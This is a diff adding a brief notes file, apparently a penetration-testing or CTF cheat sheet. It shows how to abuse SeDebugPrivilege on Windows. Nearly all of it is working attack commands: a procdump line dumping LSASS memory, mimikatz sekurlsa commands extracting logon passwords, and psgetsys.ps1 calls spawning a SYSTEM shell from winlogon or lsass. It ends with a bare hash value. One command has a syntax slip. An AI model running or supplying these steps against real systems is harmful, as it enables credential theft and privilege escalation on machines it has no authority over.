@@ -1,0 +1,27 @@
+#Requirements
+1.users has SeDebugPrivilege
+
+#Detection
+whoami /priv
+
+
+# dumping password hashes with mimikatz.exe
+procdump.exe -accepteula -ma lsass.exe lsass.dmp     /check for LSASS cuz it stores user creds after login
+mimikatz.exe
+log
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+
+# LASS = ( Local Security Authority Subsystem Service) 
+
+
+RCE to windowsNT
+
+tasklist
+.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(632,"c:\Windows\System32\cmd.exe","")
+# 632 is the PID of winlongon.exe
+.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(()Get-Process "lsass").Id,"c:\Windows\System32\cmd.exe","")
+
+64f12cddaa88057e06a81b54e73b949b
+
+ 
